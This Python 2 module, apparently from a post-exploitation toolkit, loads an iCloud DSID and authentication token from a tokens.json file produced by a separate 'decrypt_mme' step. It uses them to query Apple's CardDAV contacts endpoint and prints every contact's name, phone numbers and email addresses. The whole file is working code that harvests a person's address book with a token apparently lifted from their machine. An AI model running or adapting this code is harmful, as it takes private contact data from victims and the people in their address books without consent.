# -*- coding: utf-8 -*-
# Taken from https://github.com/manwhoami/iCloudContacts (slightly modified)
# All credits to manwhoami for his work on this.

import base64
import json
import urllib2
from os import path
from xml.etree import ElementTree as ET


def get_card_links(dsid, token):
    url = 'https://p04-contacts.icloud.com/%s/carddavhome/card' % dsid
    headers = {
        'Depth': '1',
        'Authorization': 'X-MobileMe-AuthToken %s' % base64.b64encode("%s:%s" % (dsid, token)),
        'Content-Type': 'text/xml',
    }
    data = """<?xml version="1.0" encoding="UTF-8"?>
    <A:propfind xmlns:A="DAV:">
      <A:prop>
        <A:getetag/>
      </A:prop>
    </A:propfind>
    """
    request = urllib2.Request(url, data, headers)
    request.get_method = lambda: 'PROPFIND'  # Important!
    response = urllib2.urlopen(request)
    zebra = ET.fromstring(response.read())
    returnedData = """<?xml version="1.0" encoding="UTF-8"?>
    <F:addressbook-multiget xmlns:F="urn:ietf:params:xml:ns:carddav">
      <A:prop xmlns:A="DAV:">
        <A:getetag/>
        <F:address-data/>
      </A:prop>\n"""
    for response in zebra:
        for link in response:
            href = response.find('{DAV:}href').text  # get each link in the tree
        returnedData += "<A:href xmlns:A=\"DAV:\">%s</A:href>\n" % href
    return "%s</F:addressbook-multiget>" % str(returnedData)


def getCardData(dsid, token):
    url = 'https://p04-contacts.icloud.com/%s/carddavhome/card' % dsid
    headers = {
        'Content-Type': 'text/xml',
        'Authorization': 'X-MobileMe-AuthToken %s' % base64.b64encode("%s:%s" % (dsid, token)),
    }
    data = get_card_links(dsid, token)
    request = urllib2.Request(url, data, headers)
    request.get_method = lambda: 'REPORT'  # Important!
    response = urllib2.urlopen(request)
    zebra = ET.fromstring(response.read())

    cards = []

    for response in zebra:
        tel, contact, email = [], [], []
        name = ""
        vcard = response.find('{DAV:}propstat').find('{DAV:}prop').find(
            '{urn:ietf:params:xml:ns:carddav}address-data').text
        if vcard:
            for y in vcard.splitlines():
                if y.startswith("FN:"):
                    name = y[3:]
                if y.startswith("TEL;"):
                    tel.append((y.split("type")[-1].split(":")[-1]
                                .replace("(", "").replace(")", "").replace(" ", "").replace("-", "")
                                .encode("ascii", "ignore")))
                if y.startswith("EMAIL;") or y.startswith("item1.EMAIL;"):
                    email.append(y.split(":")[-1])
            cards.append((name, tel, email))
    return sorted(cards)


def run(options):
    string_builder = ""
    token_file = path.join(options["program_directory"], "tokens.json")

    if not path.isfile(token_file):
        print("Failed to find tokens.json, run \"use decrypt_mme\" first.")
        return

    with open(token_file, "r") as input_file:
        saved_tokens = json.loads(input_file.read())

        dsid = saved_tokens["dsid"]
        token = saved_tokens["mmeAuthToken"]

    string_builder += "iCloud contacts:\n"

    card_data = getCardData(dsid, token)
    for card in card_data:
        string_builder += "%s " % card[0]

        for number in card[1]:
            string_builder += "%s " % number
        for email in card[2]:
            string_builder += "%s " % email
        string_builder += "\n"

    print(string_builder)
